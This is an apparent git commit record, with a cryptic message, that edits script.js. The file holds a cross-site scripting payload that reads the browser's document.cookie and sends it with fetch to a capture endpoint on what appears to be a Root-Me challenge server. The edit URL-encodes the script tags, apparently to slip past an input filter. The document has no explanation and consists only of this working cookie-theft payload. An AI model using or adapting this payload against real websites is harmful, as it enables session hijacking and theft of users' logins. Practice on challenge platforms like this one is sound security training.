ee230a3227e9f10ec1199264925f253749225a45
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-23 00:36:45 +0200

    tekasgambas

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-<script>
+%3Cscript%3E
   var cookies = document.cookie;
   fetch('http://challenge01.root-me.org/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
-</script>
+%3C/script%3E
